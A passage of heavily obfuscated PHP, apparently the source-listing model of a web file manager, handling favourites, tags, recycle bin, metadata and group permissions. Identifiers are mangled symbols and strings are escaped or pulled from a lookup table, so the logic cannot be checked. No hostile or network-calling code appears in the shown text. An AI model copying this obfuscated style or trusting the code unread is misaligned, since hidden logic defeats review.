cacheRemove($ÿœ®¿˜Í) { return Cache::remove($this->cacheKey($ÿœ®¿˜Í)); } protected function filterWhere($Ü÷¿ËÜ—) { return $Ü÷¿ËÜ—; } protected function cacheKey($Í“Ú€à¢) { return $Í“Ú€à¢; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\162\x63\145"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\155\x65" => "\x69\x6f\137\163\x6f\165\162\x63\x65\x5f\155\145\x74\x61", "\x6d\145\164\x61\106\x69\145\x6c\x64" => "\163\x6f\165\x72\143\x65\x49\104"); protected $dataAuto = array(array("\x6d\x6f\144\151\x66\x79\124\x69\x6d\x65", "\x74\x69\155\x65", "\x69\156\x73\145\162\x74", "\146\165\x6e\143\164\x69\157\156"), array("\143\162\145\141\164\x65\124\x69\x6d\145", "\164\151\155\145", "\x69\156\x73\x65\x72\x74", "\146\x75\156\143\164\151\x6f\156"), array("\166\x69\145\167\x54\x69\x6d\145", "\164\x69\x6d\145", "\151\156\163\145\162\x74", "\146\165\x6e\x63\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ñÜùñÖΩ) { return $this->listSource(array($_SERVER[Çâä∆◊¡][402] => $ñÜùñÖΩ)); } public function typeName($æâ’µ§Ã) { static $¶õèÀöÖ = array(self::TYPE_SYSTEM => "\163\171\163\x74\x65\155", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\162\157\x75\x70"); return $¶õèÀöÖ[$æâ’µ§Ã . $_SERVER[Çâä∆◊¡][12]]; } public function sourceListInfo($„ïÿÂ©£, $€ú»◊ŸÄ = false) { $÷ºª≥´¡ =& $_SERVER[Çâä∆◊¡]; $„ïÿÂ©£ = $„ïÿÂ©£ ? $„ïÿÂ©£ : array(); $„ïÿÂ©£ = array_filter(array_unique($„ïÿÂ©£)); if (!$„ïÿÂ©£) { return array(); } $∞ƒì¨‹π = $this->where(array($÷ºª≥´¡[403] => array($÷ºª≥´¡[7], $„ïÿÂ©£)))->select(); $this->_listDataApply($∞ƒì¨‹π, $€ú»◊ŸÄ); return array_to_keyvalue($∞ƒì¨‹π, $÷ºª≥´¡[403]); } public function pathInfoFilter(&$√ËÏßΩ¢) { $Ì‡Âª˝ƒ =& $_SERVER[Çâä∆◊¡]; static $ÖÁñ ∏« = false; static $∫Ûì˙„¥ = false; static $öó‚˚´ù = false; if (!$ÖÁñ ∏«) { $ç»≠ÆØ” = $Ì‡Âª˝ƒ[404]; $ç»≠ÆØ” .= $Ì‡Âª˝ƒ[405]; $ç»≠ÆØ” .= $Ì‡Âª˝ƒ[406]; $⁄øœÌÀ≤ = $Ì‡Âª˝ƒ[407]; $Á†˙ƒ∞Ω = explode($Ì‡Âª˝ƒ[50], $⁄øœÌÀ≤); $ÖÁñ ∏« = explode($Ì‡Âª˝ƒ[50], $ç»≠ÆØ”); $∫Ûì˙„¥ = array(); foreach ($ÖÁñ ∏« as $ÜÙ§ù’Ö) { if (in_array($ÜÙ§ù’Ö, $Á†˙ƒ∞Ω)) { continue; } $∫Ûì˙„¥[] = $ÜÙ§ù’Ö; } $öó‚˚´ù = explode($Ì‡Âª˝ƒ[50], $Ì‡Âª˝ƒ[408]); } foreach ($öó‚˚´ù as $˛ß‹€∏å) { if (isset($√ËÏßΩ¢[$˛ß‹€∏å])) { $√ËÏßΩ¢[$˛ß‹€∏å] = intval($√ËÏßΩ¢[$˛ß‹€∏å]); } } $√ËÏßΩ¢[$Ì‡Âª˝ƒ[78]] = $Ì‡Âª˝ƒ[409] . $√ËÏßΩ¢[$Ì‡Âª˝ƒ[403]] . $Ì‡Âª˝ƒ[410]; $√ËÏßΩ¢[$Ì‡Âª˝ƒ[33]] = $√ËÏßΩ¢[$Ì‡Âª˝ƒ[411]] == 1 ? $Ì‡Âª˝ƒ[79] : $Ì‡Âª˝ƒ[192]; $√ËÏßΩ¢[$Ì‡Âª˝ƒ[412]] = $this->typeName($√ËÏßΩ¢[$Ì‡Âª˝ƒ[412]]); if ($√ËÏßΩ¢[$Ì‡Âª˝ƒ[411]] != 1) { $√ËÏßΩ¢[$Ì‡Âª˝ƒ[167]] = $√ËÏßΩ¢[$Ì‡Âª˝ƒ[413]]; unset($√ËÏßΩ¢[$Ì‡Âª˝ƒ[413]]); } $ê›úú¥‘ = $ÖÁñ ∏«; if (isset($√ËÏßΩ¢[$Ì‡Âª˝ƒ[414]]) && $√ËÏßΩ¢[$Ì‡Âª˝ƒ[414]][$Ì‡Âª˝ƒ[415]] == -1) { $ê›úú¥‘ = $∫Ûì˙„¥; } $√ËÏßΩ¢ = array_field_key($√ËÏßΩ¢, $ê›úú¥‘); return $√ËÏßΩ¢; } public function listUserFav() { $◊«≤≤∑® =& $_SERVER[Çâä∆◊¡]; $ùﬂ––ì¢ = Model($◊«≤≤∑®[416])->listData(); $Ò±Øå§É = array_filter_by_field($ùﬂ––ì¢, $◊«≤≤∑®[33], $◊«≤≤∑®[417]); $Ò±Øå§É = array_to_keyvalue($Ò±Øå§É, $◊«≤≤∑®[12], $◊«≤≤∑®[78]); if ($Ò±Øå§É) { $˚Ÿøß“Å = $this->listSource(array($◊«≤≤∑®[418] => array($◊«≤≤∑®[419], $Ò±Øå§É))); } $˚Ÿøß“Å = array_to_keyvalue($˚Ÿøß“Å[$◊«≤≤∑®[364]], $◊«≤≤∑®[403]); foreach ($ùﬂ––ì¢ as &$Òˆ∆‘ÜÊ) { $Òˆ∆‘ÜÊ = array($◊«≤≤∑®[420] => $Òˆ∆‘ÜÊ[$◊«≤≤∑®[401]], $◊«≤≤∑®[421] => $Òˆ∆‘ÜÊ[$◊«≤≤∑®[32]], $◊«≤≤∑®[422] => $Òˆ∆‘ÜÊ[$◊«≤≤∑®[78]], $◊«≤≤∑®[423] => $Òˆ∆‘ÜÊ[$◊«≤≤∑®[33]], $◊«≤≤∑®[424] => $Òˆ∆‘ÜÊ[$◊«≤≤∑®[193]], $◊«≤≤∑®[425] => $Òˆ∆‘ÜÊ[$◊«≤≤∑®[86]]); if ($Òˆ∆‘ÜÊ[$◊«≤≤∑®[33]] == $◊«≤≤∑®[417] && $˚Ÿøß“Å[$Òˆ∆‘ÜÊ[$◊«≤≤∑®[78]]]) { $Òˆ∆‘ÜÊ[$◊«≤≤∑®[87]] = $˚Ÿøß“Å[$Òˆ∆‘ÜÊ[$◊«≤≤∑®[78]]]; } } unset($Òˆ∆‘ÜÊ); return $ùﬂ––ì¢; } public function listUserTag($‘◊¢Ëò±) { $⁄ÀÙôõ„ =& $_SERVER[Çâä∆◊¡]; if ($‘◊¢Ëò± && !is_array($‘◊¢Ëò±)) { $‘◊¢Ëò± = array($‘◊¢Ëò±); } $àÓÇÁ≈≈ = Model($⁄ÀÙôõ„[426])->listData(); $¨Û´ÿŸŒ = array(); foreach ($àÓÇÁ≈≈ as $Ê∏ÈÙ·à) { $ìÊ⁄Ö™ò = $Ê∏ÈÙ·à[$⁄ÀÙôõ„[78]]; if (!$ìÊ⁄Ö™ò) { continue; } if (!isset($¨Û´ÿŸŒ[$ìÊ⁄Ö™ò])) { $¨Û´ÿŸŒ[$ìÊ⁄Ö™ò] = array(); } $¨Û´ÿŸŒ[$ìÊ⁄Ö™ò][] = $Ê∏ÈÙ·à[$⁄ÀÙôõ„[427]]; } $øÛ£‰à… = array(); foreach ($¨Û´ÿŸŒ as $ú¸ûàÑ‚ => $Òüﬁ–ƒ¨) { $óÈé˚öÔ = !0; if (!$‘◊¢Ëò±) { $øÛ£‰à…[] = $ú¸ûàÑ‚; continue; } foreach ($‘◊¢Ëò± as $ò·Üäëà) { if (!in_array($ò·Üäëà, $Òüﬁ–ƒ¨)) { $óÈé˚öÔ = !1; break; } } if ($óÈé˚öÔ) { $øÛ£‰à…[] = $ú¸ûàÑ‚; } } if (!$øÛ£‰à…) { return array(); } $çí˜çπ = $this->listSource(array($⁄ÀÙôõ„[418] => array($⁄ÀÙôõ„[419], $øÛ£‰à…))); if (!$çí˜çπ || count($øÛ£‰à…) == $çí˜çπ[$⁄ÀÙôõ„[361]][$⁄ÀÙôõ„[362]]) { return $çí˜çπ; } $Àò¬€õœ = array(); $∏ø‡Ê¨ª = array_to_keyvalue($çí˜çπ[$⁄ÀÙôõ„[77]], $⁄ÀÙôõ„[12], $⁄ÀÙôõ„[403]); $ÄÒæÒêæ = array_to_keyvalue($çí˜çπ[$⁄ÀÙôõ„[76]], $⁄ÀÙôõ„[12], $⁄ÀÙôõ„[403]); $›†È™““ = array_merge($ÄÒæÒêæ, $∏ø‡Ê¨ª); foreach ($øÛ£‰à… as $ìÊ⁄Ö™ò) { if (!in_array($ìÊ⁄Ö™ò, $›†È™““)) { $Àò¬€õœ[] = $ìÊ⁄Ö™ò; } } if ($Àò¬€õœ) { Model($⁄ÀÙôõ„[428])->removeBySource($Àò¬€õœ); } return $çí˜çπ; } public function listUserRecycle() { $≈˙ÎüÎ‡ =& $_SERVER[Çâä∆◊¡]; $ÓÔÑÉ¢Æ = Model($≈˙ÎüÎ‡[429])->listData(); if (!$ÓÔÑÉ¢Æ) { return array(); } $°úç˘„‘ = array($≈˙ÎüÎ‡[418] => array($≈˙ÎüÎ‡[419], $ÓÔÑÉ¢Æ), $≈˙ÎüÎ‡[430] => 1); return $this->listSource($°úç˘„‘); } public function listSource($ﬂ®ßôº…, $ÙÔÉçﬂƒ = 3000) { $«ÛÕ∞Ü… =& $_SERVER[Çâä∆◊¡]; if (!isset($ﬂ®ßôº…[$«ÛÕ∞Ü…[431]])) { $ﬂ®ßôº…[$«ÛÕ∞Ü…[431]] = 0; } $èÔÛøËÅ = $«ÛÕ∞Ü…[432]; $ëâÇèßò = $this->field($èÔÛøËÅ)->_makeOrder()->where($ﬂ®ßôº…)->selectPage($ÙÔÉçﬂƒ); $this->_listPageCheck($ëâÇèßò, $èÔÛøËÅ, $ﬂ®ßôº…); $this->_listDataApply($ëâÇèßò[$«ÛÕ∞Ü…[364]]); $this->_listMake($ëâÇèßò); return $ëâÇèßò; } private function _listPageCheck(&$¡‚Ú—ñﬂ, $àÃÈÆº«, $õ›ÎÙíı) { $ ‘åÕª÷ =& $_SERVER[Çâä∆◊¡]; if (!is_array($¡‚Ú—ñﬂ[$ ‘åÕª÷[361]])) { return; } $õˆêŸ™¸ = $¡‚Ú—ñﬂ[$ ‘åÕª÷[361]]; if ($õˆêŸ™¸[$ ‘åÕª÷[363]] <= 1) { return; } if ($õˆêŸ™¸[$ ‘åÕª÷[362]] >= 100000) { return; } if (Model($ ‘åÕª÷[433])->get($ ‘åÕª÷[434]) != $ ‘åÕª÷[435]) { return; } $àÃÈÆº« = str_replace(array($ ‘åÕª÷[53], $ ‘åÕª÷[337], $ ‘åÕª÷[226]), $ ‘åÕª÷[12], $àÃÈÆº«); $àÃÈÆº« = $ ‘åÕª÷[436] . str_replace($ ‘åÕª÷[50], $ ‘åÕª÷[437], $àÃÈÆº«) . $ ‘åÕª÷[438]; $ÑÎëõ¬Ï = $ ‘åÕª÷[439]; $ÑÎëõ¬Ï = $ÑÎëõ¬Ï . $ ‘åÕª÷[440]; $¿…âñ≈  = $õˆêŸ™¸[$ ‘åÕª÷[358]] * ($õˆêŸ™¸[$ ‘åÕª÷[348]] - 1) . $ ‘åÕª÷[50] . $õˆêŸ™¸[$ ‘åÕª÷[358]]; $Îæ˜‰è◊ = $this->_makeOrder(!0); $Äºä¸¨¿ = $ ‘åÕª÷[436] . str_replace($ ‘åÕª÷[50], $ ‘åÕª÷[437], $Îæ˜‰è◊[0]); if (strpos($Äºä¸¨¿, $ ‘åÕª÷[441])) { $Äºä¸¨¿ = str_replace($ ‘åÕª÷[441], $ ‘åÕª÷[442], $Äºä¸¨¿); } else { $Äºä¸¨¿ .= $ ‘åÕª÷[443] . $Îæ˜‰è◊[1]; } $íÈ∑¸–Œ = array(); foreach ($õ›ÎÙíı as $Î•∞Ø÷ı => $˘§◊◊◊È) { $íÈ∑¸–Œ[$ ‘åÕª÷[436] . $Î•∞Ø÷ı] = $˘§◊◊◊È; } $this->alias($ ‘åÕª÷[444])->field($àÃÈÆº«)->limit($¿…âñ≈ )->order($Äºä¸¨¿); $∂â‡†· = $this->join($ÑÎëõ¬Ï)->where($íÈ∑¸–Œ)->select(); if ($∂â‡†·) { $¡‚Ú—ñﬂ[$ ‘åÕª÷[364]] = $∂â‡†·; } } protected function _makeOrder($Ä∂≈Õã≤ = false) { $ƒïÑ¨ï¶ =& $_SERVER[Çâä∆◊¡]; $ºÅöË≈ê = Model($ƒïÑ¨ï¶[445])->get($ƒïÑ¨ï¶[446]); $˝Ãªòúæ = Model($ƒïÑ¨ï¶[445])->get($ƒïÑ¨ï¶[447]); $ªÉÂ—º· = array($ƒïÑ¨ï¶[448] => $ƒïÑ¨ï¶[449], $ƒïÑ¨ï¶[450] => $ƒïÑ¨ï¶[451]); $ó—üùÕè = array($ƒïÑ¨ï¶[32] => $ƒïÑ¨ï¶[32], $ƒïÑ¨ï¶[80] => $ƒïÑ¨ï¶[80], $ƒïÑ¨ï¶[167] => $ƒïÑ¨ï¶[413], $ƒïÑ¨ï¶[452] => $ƒïÑ¨ï¶[452], $ƒïÑ¨ï¶[453] => $ƒïÑ¨ï¶[454], $ƒïÑ¨ï¶[193] => $ƒïÑ¨ï¶[193], $ƒïÑ¨ï¶[86] => $ƒïÑ¨ï¶[86]); $ˆ®Ÿ˝∏ = Input::get($ƒïÑ¨ï¶[455], $ƒïÑ¨ï¶[7], $ºÅöË≈ê, array_keys($ó—üùÕè)); $îôØø÷ä = Input::get($ƒïÑ¨ï¶[456], $ƒïÑ¨ï¶[7], $˝Ãªòúæ, array_keys($ªÉÂ—º·)); if (!in_array($ˆ®Ÿ˝∏, array_keys($ó—üùÕè))) { $ˆ®Ÿ˝∏ = $ƒïÑ¨ï¶[32]; } if (!in_array($îôØø÷ä, array_keys($ªÉÂ—º·))) { $ˆ®Ÿ˝∏ = $ƒïÑ¨ï¶[448]; } if ($ˆ®Ÿ˝∏ == $ƒïÑ¨ï¶[32]) { } $ﬁÅãÑ¥ô = $ƒïÑ¨ï¶[457] . $ó—üùÕè[$ˆ®Ÿ˝∏] . $ƒïÑ¨ï¶[53] . $ªÉÂ—º·[$îôØø÷ä]; $ﬁÅãÑ¥ô = rtrim(trim($ﬁÅãÑ¥ô), $ƒïÑ¨ï¶[50]); if ($Ä∂≈Õã≤) { return array($ﬁÅãÑ¥ô, $ªÉÂ—º·[$îôØø÷ä]); } return $this->order($ﬁÅãÑ¥ô); } protected function _listDataApplyItem($¨’Áï™, $˜†ò”Èß = false) { $Û‚°°¬Ê = array($¨’Áï™); $this->_listDataApply($Û‚°°¬Ê, $˜†ò”Èß); return $Û‚°°¬Ê[0]; } protected function _listDataApply(&$œÌ –ù‚, $¨“áÖßΩ = false) { $’®÷æâÒ =& $_SERVER[Çâä∆◊¡]; if (!$œÌ –ù‚) { $œÌ –ù‚ = array(); return; } $≈ø∂€˙Ã = array_to_keyvalue($œÌ –ù‚, $’®÷æâÒ[12], $’®÷æâÒ[403]); $≈ø∂€˙Ã = array_unique($≈ø∂€˙Ã); $this->_listSourceCache($œÌ –ù‚); if (!$¨“áÖßΩ) { $this->_listAppendMeta($œÌ –ù‚, $≈ø∂€˙Ã); $this->_listAppendFileMeta($œÌ –ù‚, $≈ø∂€˙Ã); $this->_listAppendChildren($œÌ –ù‚, $≈ø∂€˙Ã); } $this->_listAppendPath($œÌ –ù‚); $this->_listAppendAuth($œÌ –ù‚); $this->_listAppendSourceInfo($œÌ –ù‚, $≈ø∂€˙Ã); $this->_listAppendUser($œÌ –ù‚); $this->_listFilterInfo($œÌ –ù‚, $¨“áÖßΩ); $this->_listAppendAuthSecret($œÌ –ù‚); } protected function _listSourceCache($¶ÙŸ√™·) { $û…◊ãË≥ =& $_SERVER[Çâä∆◊¡]; foreach ($¶ÙŸ√™· as $õ—á«∆å) { self::$cacheSourceInfo[$û…◊ãË≥[458] . $õ—á«∆å[$û…◊ãË≥[403]]] = $õ—á«∆å; } } protected function _listFilterInfo(&$å≤Ø”«ã, $øí—È·î = false) { $§Ìﬂπ›´ =& $_SERVER[Çâä∆◊¡]; foreach ($å≤Ø”«ã as &$¶ªØ˙†Ü) { $¶ªØ˙†Ü = $this->pathInfoFilter($¶ªØ˙†Ü); self::$cachePathInfo[$§Ìﬂπ›´[459] . intval($øí—È·î) . $§Ìﬂπ›´[460] . $¶ªØ˙†Ü[$§Ìﬂπ›´[403]]] = $¶ªØ˙†Ü; } unset($¶ªØ˙†Ü); } protected function _listMake(&$ø˙Ø¡â¶) { $ΩÍÍò°∏ =& $_SERVER[Çâä∆◊¡]; $ø˙Ø¡â¶[$ΩÍÍò°∏[77]] = array(); $ø˙Ø¡â¶[$ΩÍÍò°∏[76]] = array(); foreach ($ø˙Ø¡â¶[$ΩÍÍò°∏[364]] as $î”Á◊î≈) { $©™Áöì  = $î”Á◊î≈[$ΩÍÍò°∏[411]] == 1 ? $ΩÍÍò°∏[77] : $ΩÍÍò°∏[76]; $ø˙Ø¡â¶[$©™Áöì ][] = $î”Á◊î≈; } unset($ø˙Ø¡â¶[$ΩÍÍò°∏[364]]); } protected function _listAppendMeta(&$‚÷”◊®î, $ı¯ôèÿ¿) { $µ”© ﬂ≤ =& $_SERVER[Çâä∆◊¡]; $â¬ÖﬂÛ® = array($µ”© ﬂ≤[418] => array($µ”© ﬂ≤[419], $ı¯ôèÿ¿)); $é¯‹™˙ñ = Model($µ”© ﬂ≤[461])->field($µ”© ﬂ≤[462])->where($â¬ÖﬂÛ®)->select(); if (!$é¯‹™˙ñ) { return; } $ÕåÁ¬˜¢ = array($µ”© ﬂ≤[463], $µ”© ﬂ≤[464], $µ”© ﬂ≤[442]); $Àï≤‚©∂ = array(); foreach ($é¯‹™˙ñ as $˙¯√ÌÊ¢) { if (!isset($Àï≤‚©∂[$˙¯√ÌÊ¢[$µ”© ﬂ≤[403]]])) { $Àï≤‚©∂[$˙¯√ÌÊ¢[$µ”© ﬂ≤[403]]] = array(); } if (in_array($˙¯√ÌÊ¢[$µ”© ﬂ≤[95]], $ÕåÁ¬˜¢)) { continue; } $Àï≤‚©∂[$˙¯√ÌÊ¢[$µ”© ﬂ≤[403]]][$˙¯√ÌÊ¢[$µ”© ﬂ≤[95]]] = $˙¯√ÌÊ¢[$µ”© ﬂ≤[369]]; } foreach ($‚÷”◊®î as &$“ÅÍÄ…±) { $“ÅÍÄ…±[$µ”© ﬂ≤[465]] = !1; if (isset($Àï≤‚©∂[$“ÅÍÄ…±[$µ”© ﬂ≤[403]]])) { $“ÅÍÄ…±[$µ”© ﬂ≤[465]] = $Àï≤‚©∂[$“ÅÍÄ…±[$µ”© ﬂ≤[403]]]; } if ($this->fileIsLock($“ÅÍÄ…±) && $“ÅÍÄ…±[$µ”© ﬂ≤[414]]) { $ä∏û‚˘ç = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $“ÅÍÄ…±[$µ”© ﬂ≤[414]][$µ”© ﬂ≤[415]] = AuthModel::authDisable($“ÅÍÄ…±[$µ”© ﬂ≤[414]][$µ”© ﬂ≤[415]], $ä∏û‚˘ç); $“ÅÍÄ…±[$µ”© ﬂ≤[414]][$µ”© ﬂ≤[466]][$µ”© ﬂ≤[414]] = $“ÅÍÄ…±[$µ”© ﬂ≤[414]][$µ”© ﬂ≤[415]]; } } unset($“ÅÍÄ…±); } protected function _listAppendFileMeta(&$ßË˜¡ôß, $˚–µ¸≠Ø) { $ãπéØÇ =& $_SERVER[Çâä∆◊¡]; $°ÁÿÅê∏ = array_to_keyvalue($ßË˜¡ôß, $ãπéØÇ[12], $ãπéØÇ[467]); $°ÁÿÅê∏ = array_filter(array_unique($°ÁÿÅê∏)); if (!$°ÁÿÅê∏) { return; } $‰®ˆπ∏ = array($ãπéØÇ[468] => array($ãπéØÇ[419], $°ÁÿÅê∏)); $¡•¸™®» = $ãπéØÇ[469]; $ì√ﬂö÷ù = Model($ãπéØÇ[470])->field($¡•¸™®»)->where($‰®ˆπ∏)->select(); $ì√ﬂö÷ù = array_to_keyvalue($ì√ﬂö÷ù, $ãπéØÇ[467]); $ÿ‚¿º¡∂ = Model($ãπéØÇ[471])->field($ãπéØÇ[472])->where($‰®ˆπ∏)->select(); $ÿ‚¿º¡∂ = $ÿ‚¿º¡∂ ? $ÿ‚¿º¡∂ : array(); $§∑ì•Ë“ = array(); foreach ($ÿ‚¿º¡∂ as $Ë˜ë’ùä) { if (!isset($§∑ì•Ë“[$Ë˜ë’ùä[$ãπéØÇ[467]]])) { $§∑ì•Ë“[$Ë˜ë’ùä[$ãπéØÇ[467]]] = array(); } $§∑ì•Ë“[$Ë˜ë’ùä[$ãπéØÇ[467]]][$Ë˜ë’ùä[$ãπéØÇ[95]]] = $Ë˜ë’ùä[$ãπéØÇ[369]]; } foreach ($ßË˜¡ôß as &$‹ÚœëôÈ) { $äÎ¬Ø…˝ = $‹ÚœëôÈ[$ãπéØÇ[467]]; if (!$äÎ¬Ø…˝ || !is_array($ì√ﬂö÷ù[$äÎ¬Ø…˝])) { continue; } $∆∂òÚ—˛ = $ì√ﬂö÷ù[$äÎ¬Ø…˝]; $∆∂òÚ—˛[$ãπéØÇ[80]] = $‹ÚœëôÈ[$ãπéØÇ[80]]; $∆∂òÚ—˛[$ãπéØÇ[32]] = $‹ÚœëôÈ[$ãπéØÇ[32]]; if (!isset(self::$cacheFileInfo[$ãπéØÇ[473] . $äÎ¬Ø…˝])) { self::$cacheFileInfo[$ãπéØÇ[473] . $äÎ¬Ø…˝] = array_merge(array(), $∆∂òÚ—˛); } unset($ì√ﬂö÷ù[$äÎ¬Ø…˝][$ãπéØÇ[78]]); $âﬁ•ÚÈ¶ = is_array($§∑ì•Ë“[$äÎ¬Ø…˝]) ? $§∑ì•Ë“[$äÎ¬Ø…˝] : array(); $‹ÚœëôÈ[$ãπéØÇ[163]] = array_merge($âﬁ•ÚÈ¶, $ì√ﬂö÷ù[$äÎ¬Ø…˝]); if (isset($‹ÚœëôÈ[$ãπéØÇ[163]][$ãπéØÇ[162]])) { $‹ÚœëôÈ[$ãπéØÇ[162]] = json_decode($‹ÚœëôÈ[$ãπéØÇ[163]][$ãπéØÇ[162]], !0); unset($‹ÚœëôÈ[$ãπéØÇ[163]][$ãπéØÇ[162]]); } } unset($‹ÚœëôÈ); } protected function _listAppendSourceInfo(&$–®èÂéô, $¡Ú¨ÌëÉ) { $Ωú¥√∞ﬁ =& $_SERVER[Çâä∆◊¡]; if (!defined($Ωú¥√∞ﬁ[474])) { return; } $ôﬂŸ’Ã = Model($Ωú¥√∞ﬁ[475])->listData(); $úòàËåï = Model($Ωú¥√∞ﬁ[426])->listData(); $”“öÅ¸Û = Model($Ωú¥√∞ﬁ[416])->listData(); $—◊ç¶òé = Model($Ωú¥√∞ﬁ[476])->listSimple(); $¿˝Î¶¸Ñ = array_to_keyvalue($ôﬂŸ’Ã, $Ωú¥√∞ﬁ[401]); $™˘∑¨ãÁ = array_to_keyvalue_group($úòàËåï, $Ωú¥√∞ﬁ[78], $Ωú¥√∞ﬁ[427]); $Üı≠Ã°‰ = array_to_keyvalue($”“öÅ¸Û, $Ωú¥√∞ﬁ[78]); $ÇÿôåŒÅ = array_to_keyvalue_group($—◊ç¶òé, $Ωú¥√∞ﬁ[403]); foreach ($–®èÂéô as &$∞ÜÏëÂ ) { $∞ÜÏëÂ [$Ωú¥√∞ﬁ[87]] = array($Ωú¥√∞ﬁ[477] => 0, $Ωú¥√∞ﬁ[478] => 0, $Ωú¥√∞ﬁ[479] => 0); if (isset($Üı≠Ã°‰[$∞ÜÏëÂ [$Ωú¥√∞ﬁ[403]]])) { $∞ÜÏëÂ [$Ωú¥√∞ﬁ[87]][$Ωú¥√∞ﬁ[480]] = 1; $∞ÜÏëÂ [$Ωú¥√∞ﬁ[87]][$Ωú¥√∞ﬁ[481]] = $Üı≠Ã°‰[$∞ÜÏëÂ [$Ωú¥√∞ﬁ[403]]][$Ωú¥√∞ﬁ[32]]; } if (isset($™˘∑¨ãÁ[$∞ÜÏëÂ [$Ωú¥√∞ﬁ[403]]])) { $∞ÜÏëÂ [$Ωú¥√∞ﬁ[87]][$Ωú¥√∞ﬁ[482]] = array(); foreach ($™˘∑¨ãÁ[$∞ÜÏëÂ [$Ωú¥√∞ﬁ[403]]] as $¸ßñø˘‹) { $ﬂ£¶å•Ô = $¿˝Î¶¸Ñ[$¸ßñø˘‹]; $∞ÜÏëÂ [$Ωú¥√∞ﬁ[87]][$Ωú¥√∞ﬁ[482]][] = array($Ωú¥√∞ﬁ[483] => $ﬂ£¶å•Ô[$Ωú¥√∞ﬁ[401]], $Ωú¥√∞ﬁ[421] => $ﬂ£¶å•Ô[$Ωú¥√∞ﬁ[32]], $Ωú¥√∞ﬁ[484] => $ﬂ£¶å•Ô[$Ωú¥√∞ﬁ[485]]); } } if (isset($ÇÿôåŒÅ[$∞ÜÏëÂ [$Ωú¥√∞ﬁ[403]]])) { $∞ÜÏëÂ [$Ωú¥√∞ﬁ[87]][$Ωú¥√∞ﬁ[486]] = array(); foreach ($ÇÿôåŒÅ[$∞ÜÏëÂ [$Ωú¥√∞ﬁ[403]]] as $º∂íÌÕ©) { $∞ÜÏëÂ [$Ωú¥√∞ﬁ[87]][$Ωú¥√∞ﬁ[486]] = array($Ωú¥√∞ﬁ[487] => $º∂íÌÕ©[$Ωú¥√∞ﬁ[488]], $Ωú¥√∞ﬁ[489] => $º∂íÌÕ©[$Ωú¥√∞ﬁ[490]], $Ωú¥√∞ﬁ[491] => $º∂íÌÕ©[$Ωú¥√∞ﬁ[403]], $Ωú¥√∞ﬁ[492] => $º∂íÌÕ©[$Ωú¥√∞ﬁ[493]], $Ωú¥√∞ﬁ[494] => $º∂íÌÕ©[$Ωú¥√∞ﬁ[495]], $Ωú¥√∞ﬁ[496] => $º∂íÌÕ©[$Ωú¥√∞ﬁ[496]], $Ωú¥√∞ﬁ[497] => $º∂íÌÕ©[$Ωú¥√∞ﬁ[497]]); } } } unset($∞ÜÏëÂ ); return $–®èÂéô; } protected function _listAppendChildren(&$æÆÂ»›Ø, $‘Ú≤›Ò„) { $°Üà€å™ =& $_SERVER[Çâä∆◊¡]; $’∂ûóøÙ = array(); $»‹∞ß‹Å = array($°Üà€å™[202] => 0, $°Üà€å™[203] => 0); foreach ($æÆÂ»›Ø as &$Òó¸›õº) { if (!$Òó¸›õº[$°Üà€å™[411]]) { continue; } $’∂ûóøÙ[] = $Òó¸›õº[$°Üà€å™[403]]; } unset($Òó¸›õº); if (!$’∂ûóøÙ) { return; } $Õ–•¨é€ = array($°Üà€å™[498] => array($°Üà€å™[7], $’∂ûóøÙ)); $´Ç‚≥≠œ = array($°Üà€å™[498], $°Üà€å™[411], $°Üà€å™[499] => $°Üà€å™[500]); $à„”¸è¡ = $this->field($´Ç‚≥≠œ)->where($Õ–•¨é€)->group($°Üà€å™[501])->select(); $®˝ªîˆ„ = array(); foreach ($à„”¸è¡ as $’‡ıì“Ã) { $´†√¶ÿ‹ = $’‡ıì“Ã[$°Üà€å™[498]]; $€¬≤ôü◊ = $’‡ıì“Ã[$°Üà€å™[411]] == $°Üà€å™[89] ? $°Üà€å™[203] : $°Üà€å™[202]; if (!isset($®˝ªîˆ„[$´†√¶ÿ‹])) { $®˝ªîˆ„[$´†√¶ÿ‹] = array($°Üà€å™[202] => 0, $°Üà€å™[203] => 0); } $®˝ªîˆ„[$´†√¶ÿ‹][$€¬≤ôü◊] += $’‡ıì“Ã[$°Üà€å™[500]]; } foreach ($æÆÂ»›Ø as &$Òó¸›õº) { if (!$Òó¸›õº[$°Üà€å™[411]]) { continue; } $à¡ê√ì” = is_array($®˝ªîˆ„[$Òó¸›õº[$°Üà€å™[403]]]) ? $®˝ªîˆ„[$Òó¸›õº[$°Üà€å™[403]]] : $»‹∞ß‹Å; $Òó¸›õº[$°Üà€å™[203]] = $à¡ê√ì”[$°Üà€å™[203]]; $Òó¸›õº[$°Üà€å™[202]] = $à¡ê√ì”[$°Üà€å™[202]]; unset($Òó¸›õº[$°Üà€å™[413]]); } unset($Òó¸›õº); } protected function _listAppendAuth(&$ ˘¥õ›ª) { $áìÜ©¥ì =& $_SERVER[Çâä∆◊¡]; if (!defined($áìÜ©¥ì[474])) { return; } $ÌÚ“–ï∂ = array(); foreach ($ ˘¥õ›ª as $Ìß±íÔ£) { if ($Ìß±íÔ£[$áìÜ©¥ì[412]] == self::TYPE_GROUP) { $ÌÚ“–ï∂[] = $Ìß±íÔ£[$áìÜ©¥ì[403]]; } } if (!$ÌÚ“–ï∂) { return; } $çºî≥ÀŒ = array_to_keyvalue($ ˘¥õ›ª, $áìÜ©¥ì[403]); $Ãı©ƒ±∏ = Model($áìÜ©¥ì[502])->getSourceList($ÌÚ“–ï∂, $çºî≥ÀŒ); foreach ($ ˘¥õ›ª as $ƒëœ⁄÷Ê => &$Ìß±íÔ£) { $Ìß±íÔ£[$áìÜ©¥ì[414]] = $Ãı©ƒ±∏[$Ìß±íÔ£[$áìÜ©¥ì[403]]]; if (!$Ìß±íÔ£[$áìÜ©¥ì[414]] && $Ìß±íÔ£[$áìÜ©¥ì[412]] == self::TYPE_GROUP) { $Ìß±íÔ£[$áìÜ©¥ì[414]] = Action($áìÜ©¥ì[503])->pathGroupAuthMake($Ìß±íÔ£[$áìÜ©¥ì[504]]); if (!$Ìß±íÔ£[$áìÜ©¥ì[414]] && !_get($GLOBALS, $áìÜ©¥ì[505])) { 